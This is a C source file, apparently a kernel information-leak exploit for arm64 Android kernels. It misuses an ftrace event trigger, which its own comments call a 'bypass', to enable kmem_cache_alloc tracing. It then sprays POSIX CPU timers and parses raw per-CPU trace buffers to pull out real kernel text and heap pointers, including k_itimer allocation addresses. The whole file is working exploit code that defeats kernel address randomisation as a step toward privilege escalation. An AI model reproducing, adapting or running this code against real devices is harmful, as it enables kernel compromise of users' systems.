/*
 * leakprobe - read raw ftrace records and extract real kernel pointers.
 * Read-only: enables an existing tracepoint that the device already exposes,
 * allocates POSIX CPU timers in its own process, and parses the binary stream.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <signal.h>
#include <time.h>
#include <stdint.h>

#define T "/sys/kernel/tracing"

static void noop(int s) { (void)s; }

static int read_int_file(const char *path)
{
    char buf[64];
    int fd = open(path, O_RDONLY);
    ssize_t n;
    if (fd < 0) return -1;
    n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return -1;
    buf[n] = 0;
    return atoi(buf);
}

static int write_str(const char *path, const char *val)
{
    int fd = open(path, O_WRONLY);
    ssize_t n;
    if (fd < 0) return -1;
    n = write(fd, val, strlen(val));
    close(fd);
    return n > 0 ? 0 : -1;
}

int main(void)
{
    int id, fds[16], nfds = 0, i;
    unsigned char buf[1 << 16];
    size_t total = 0;
    unsigned char *all;
    struct sigaction sa;
    timer_t t[64];
    struct sigevent sev;
    struct itimerspec its;
    int armed = 0;
    int found = 0;
    (void)id;

    id = read_int_file(T "/events/kmem/kmem_cache_alloc/id");
    printf("kmem_cache_alloc event id = %d (not needed; scanning by record shape)\n", id);

    /* start clean and arm the tracepoint through the trigger bypass */
    write_str(T "/tracing_on", "0\n");
    {
        int fd = open(T "/trace", O_WRONLY|O_TRUNC);
        if (fd >= 0) close(fd);
    }
    if (getenv("TR_SKIP_TRIGGER") == NULL) {
        if (write_str(T "/events/kmem/rss_stat/trigger",
                      "enable_event:kmem:kmem_cache_alloc\n") == 0) {
            printf("kmem_cache_alloc enabled via rss_stat trigger\n");
        } else {
            printf("trigger write failed (%s); assuming it is already set\n", strerror(errno));
        }
    } else {
        printf("trigger managed externally\n");
    }
    write_str(T "/tracing_on", "1\n");

    /* The trigger only fires when the rss_stat event itself happens, so make
     * anonymous page faults before arming anything. */
    {
        size_t nsz = 8u << 20;
        char *m = malloc(nsz);
        if (m) {
            memset(m, 0x5a, nsz);
            free(m);
            printf("faulted %zu bytes to fire rss_stat\n", nsz);
        }
    }

    for (i = 0; i < 16; i++) {
        char p[128];
        snprintf(p, sizeof(p), T "/per_cpu/cpu%d/trace_pipe_raw", i);
        fds[nfds] = open(p, O_RDONLY | O_NONBLOCK);
        if (fds[nfds] < 0) break;
        nfds++;
    }
    printf("opened %d raw per-cpu pipes\n", nfds);

    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = noop;
    sigaction(SIGRTMIN, &sa, NULL);
    memset(&sev, 0, sizeof(sev));
    sev.sigev_notify = SIGEV_SIGNAL;
    sev.sigev_signo = SIGRTMIN;
    memset(&its, 0, sizeof(its));
    its.it_value.tv_nsec = 500000L;
    its.it_interval.tv_nsec = 500000L;

    all = malloc(1 << 22);
    if (!all) return 1;

    for (i = 0; i < 64; i++) {
        if (timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &t[i]) != 0) break;
        if (timer_settime(t[i], 0, &its, NULL) != 0) break;
        armed++;
    }
    printf("armed %d timers (SIGEV_SIGNAL)\n", armed);

    {
        int rounds;
        for (rounds = 0; rounds < 60; rounds++) {
            struct pollfd pfd[16];
            for (i = 0; i < nfds; i++) { pfd[i].fd = fds[i]; pfd[i].events = POLLIN; }
            if (poll(pfd, nfds, 50) <= 0) continue;
            for (i = 0; i < nfds; i++) {
                if (pfd[i].revents & POLLIN) {
                    ssize_t n = read(fds[i], buf, sizeof(buf));
                    if (n > 0 && total + (size_t)n < (1u << 22)) {
                        memcpy(all + total, buf, (size_t)n);
                        total += (size_t)n;
                    }
                }
            }
        }
    }
    for (i = 0; i < armed; i++) timer_delete(t[i]);
    write_str(T "/tracing_on", "0\n");
    for (i = 0; i < nfds; i++) close(fds[i]);

    printf("captured %zu raw bytes\n", total);

    /* Robust scan: any aligned 8-byte value inside the kernel virtual range is
     * a real pointer (call_site text address or heap object). We do not need to
     * decode the ring-buffer record layout for that. */
    {
        size_t o;
        int shown_text = 0, shown_heap = 0;
        for (o = 0; o + 8 <= total; o += 4) {
            uint64_t v;
            memcpy(&v, all + o, 8);
            if (v < 0xffff000000000000ULL) continue;
            /* text: 0xffff8...-0xffffb... on arm64 GKI; heap/vmemmap: 0xfffff... */
            if (v >= 0xffff800000000000ULL && v < 0xfffec00000000000ULL) {
                if (shown_text < 6) {
                    printf("  [text?] off=%-7zu 0x%016llx\n", o, (unsigned long long)v);
                    shown_text++;
                }
            } else if (shown_heap < 4) {
                printf("  [heap?] off=%-7zu 0x%016llx\n", o, (unsigned long long)v);
                shown_heap++;
            }
        }
        printf("kernel-range values: text-ish=%d heap-ish=%d\n", shown_text, shown_heap);
    }

    /* Walk records: struct { u16 type; u8 flags; u8 preempt; int pid; } then payload */
    {
        size_t off = 0;
        while (off + 8 < total) {
            uint16_t type;
            uint32_t size;
            memcpy(&type, all + off, 2);
            memcpy(&size, all + off + 4, 4);
            if (size < 8 || off + size > total) break;
            if (size == 48) {
                uint64_t call_site, ptr, req;
                memcpy(&call_site, all + off + 8, 8);
                memcpy(&ptr, all + off + 16, 8);
                memcpy(&req, all + off + 24, 8);
                if (req == 0x180 && call_site >= 0xffff000000000000ULL) {
                    printf("HIT k_itimer alloc: call_site=0x%llx ptr=0x%llx bytes_req=0x%llx\n",
                           (unsigned long long)call_site, (unsigned long long)ptr,
                           (unsigned long long)req);
                    found++;
                    if (found >= 6) break;
                }
            }
            off += size;
        }
    }
    if (!found) {
        printf("no k_itimer allocation record found (bytes_req=0x180)\n");
        /* Fall back: print any kernel-text call_site we did see */
        size_t off = 0;
        int printed = 0;
        while (off + 8 < total && printed < 5) {
            uint16_t type; uint32_t size;
            memcpy(&type, all + off, 2);
            memcpy(&size, all + off + 4, 4);
            if (size < 8 || off + size > total) break;
            if (size == 48) {
                uint64_t cs, req;
                memcpy(&cs, all + off + 8, 8);
                memcpy(&req, all + off + 24, 8);
                if (cs >= 0xffff000000000000ULL) {
                    printf("any alloc: call_site=0x%llx bytes_req=0x%llx\n",
                           (unsigned long long)cs, (unsigned long long)req);
                    printed++;
                }
            }
            off += size;
        }
    }
    return found > 0 ? 0 : 2;
}
